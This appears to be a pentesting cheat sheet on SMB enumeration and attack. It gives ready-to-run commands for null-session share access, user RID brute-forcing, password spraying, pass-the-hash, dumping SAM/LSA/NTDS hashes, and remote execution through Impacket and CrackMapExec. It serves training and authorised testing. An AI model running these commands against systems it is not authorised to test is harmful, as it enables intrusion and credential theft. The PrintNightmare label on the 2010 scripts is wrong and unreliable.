# 🗂️ SMB Enumeration (Ports 139, 445)

> **SMB is one of the most exploitable services on Windows machines.** Always enumerate it fully — shares, users, vulnerabilities.

---

## Table of Contents
- [Quick SMB Checklist](#quick-smb-checklist)
- [Basic Enumeration](#basic-enumeration)
- [Share Enumeration & Access](#share-enumeration--access)
- [User & Group Enumeration](#user--group-enumeration)
- [Vulnerability Scanning](#vulnerability-scanning)
- [CrackMapExec (CME)](#crackmapexec-cme)
- [Impacket Tools](#impacket-tools)
- [RPC Enumeration](#rpc-enumeration)

---

## Quick SMB Checklist

Run these on every machine with SMB open:

```bash
# 1. Null session / guest access check
smbclient -L //$IP -N
smbmap -H $IP

# 2. Comprehensive enum
enum4linux-ng -A $IP

# 3. Vulnerability check
nmap --script smb-vuln* -p 445 $IP
```

---

## Basic Enumeration

- [ ] **Check SMB protocol version**:
  ```bash
  nmap --script smb-protocols $IP -p 445
  ```
- [ ] **OS and machine info**:
  ```bash
  nmap --script smb-os-discovery $IP -p 445
  ```
- [ ] **enum4linux** (classic, broad enumeration):
  ```bash
  enum4linux -a $IP
  ```
- [ ] **enum4linux-ng** (modern, more reliable):
  ```bash
  enum4linux-ng -A $IP
  enum4linux-ng -A -C $IP  # Include ACLs
  ```

---

## Share Enumeration & Access

- [ ] **List shares (null/anonymous)**:
  ```bash
  smbclient -L //$IP -N               # No password
  smbclient -L //$IP -U "guest"%""    # Guest account
  smbclient -L //$IP -U ""            # Blank username
  ```
- [ ] **smbmap — permissions view**:
  ```bash
  smbmap -H $IP                         # Null session
  smbmap -H $IP -u null -p null         # Explicit null
  smbmap -H $IP -u <user> -p <pass>     # Authenticated
  smbmap -H $IP -u <user> -p <pass> -R  # Recursive listing
  ```
- [ ] **Connect to a specific share**:
  ```bash
  smbclient //$IP/<sharename> -N
  smbclient //$IP/<sharename> -U <user>
  ```
- [ ] **smbclient commands once connected**:
  ```
  ls                  # list files
  get <filename>      # download file
  put <filename>      # upload file
  recurse ON          # enable recursive listing
  prompt OFF          # no confirmation
  mget *              # download all files
  ```
- [ ] **Spider shares for interesting files**:
  ```bash
  # manspider (searches content within files)
  manspider //$IP -u <user> -p <pass> -d <domain> --pattern password,cred,secret
  ```
- [ ] **CrackMapExec — spider shares**:
  ```bash
  crackmapexec smb $IP -u <user> -p <pass> -M spider_plus
  ```

---

## User & Group Enumeration

- [ ] **List users via RID brute-force** (no credentials needed):
  ```bash
  crackmapexec smb $IP -u "" -p "" --rid-brute
  enum4linux-ng -U $IP
  ```
- [ ] **List domain users** (authenticated):
  ```bash
  crackmapexec smb $IP -u <user> -p <pass> --users
  crackmapexec smb $IP -u <user> -p <pass> --groups
  crackmapexec smb $IP -u <user> -p <pass> --local-users
  ```
- [ ] **Nmap user scripts**:
  ```bash
  nmap --script smb-enum-users -p 445 $IP
  nmap --script smb-enum-groups -p 445 $IP
  nmap --script smb-enum-shares -p 445 $IP
  ```

---

## Vulnerability Scanning

- [ ] **All SMB vuln scripts**:
  ```bash
  nmap --script smb-vuln* -p 445 $IP
  ```
- [ ] **Specific critical CVEs**:
  ```bash
  # EternalBlue (MS17-010) — affects Windows 7/2008
  nmap --script smb-vuln-ms17-010 -p 445 $IP

  # MS08-067 — Windows XP/2003
  nmap --script smb-vuln-ms08-067 -p 445 $IP

  # PrintNightmare — affects many Windows versions
  nmap --script smb-vuln-ms10-054,smb-vuln-ms10-061 -p 445 $IP
  ```
- [ ] **Check SMB signing** (important for relay attacks):
  ```bash
  crackmapexec smb $IP --gen-relay-list relayable.txt
  # SMB signing disabled = vulnerable to relay attacks
  ```

---

## CrackMapExec (CME)

The Swiss Army knife for SMB (and more):

- [ ] **Basic authentication test**:
  ```bash
  crackmapexec smb $IP -u <user> -p <pass>
  crackmapexec smb $IP -u <user> -H <ntlm_hash>    # Pass-the-Hash
  ```
- [ ] **Password spraying**:
  ```bash
  crackmapexec smb $IP -u users.txt -p <password> --continue-on-success
  crackmapexec smb $IP -u users.txt -p passwords.txt --no-bruteforce
  ```
- [ ] **Command execution** (if admin):
  ```bash
  crackmapexec smb $IP -u <user> -p <pass> -x "whoami"
  crackmapexec smb $IP -u <user> -p <pass> -X "Get-Process"  # PowerShell
  ```
- [ ] **Dump SAM/LSA**:
  ```bash
  crackmapexec smb $IP -u <user> -p <pass> --sam
  crackmapexec smb $IP -u <user> -p <pass> --lsa
  crackmapexec smb $IP -u <user> -p <pass> --ntds   # Domain controller
  ```
- [ ] **List logged-on users**:
  ```bash
  crackmapexec smb $IP -u <user> -p <pass> --loggedon-users
  ```

---

## Impacket Tools

- [ ] **psexec.py** — remote command execution:
  ```bash
  python3 psexec.py <domain>/<user>:<pass>@$IP
  python3 psexec.py -hashes :<ntlm_hash> <user>@$IP
  ```
- [ ] **smbexec.py** — less noisy than psexec:
  ```bash
  python3 smbexec.py <domain>/<user>:<pass>@$IP
  ```
- [ ] **wmiexec.py** — WMI-based execution (even less noisy):
  ```bash
  python3 wmiexec.py <domain>/<user>:<pass>@$IP
  ```

---

## RPC Enumeration

- [ ] **rpcclient — null session**:
  ```bash
  rpcclient -U "" -N $IP
  rpcclient -U "<user>%<pass>" $IP
  ```
- [ ] **Useful rpcclient commands**:
  ```
  enumdomusers          # List domain users
  enumdomgroups         # List domain groups
  queryuser <RID>       # User details (e.g., queryuser 0x1f4)
  querygroup <RID>      # Group details
  querydispinfo         # User display info
  getdompwinfo          # Password policy
  netshareenumall       # List all shares
  ```
- [ ] **RID cycling** (enumerate users when no null session):
  ```bash
  for rid in $(seq 500 1100); do \
    rpcclient -U "" -N $IP -c "queryuser 0x$(printf '%x' $rid)" 2>/dev/null | \
    grep "User Name"; done
  ```

---

## 🔗 References

- [HackTricks — SMB](https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb)
- [CrackMapExec Wiki](https://wiki.porchetta.industries/)
- [Impacket Examples](https://github.com/fortra/impacket/tree/master/examples)
- [EternalBlue Exploit Guide](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ms17-010-eternalblue)

---

*[← DNS Enumeration](./03_dns_enum.md) · [Recon Hub](./README.md) · [LDAP/AD Enumeration →](./05_ldap_ad_enum.md)*
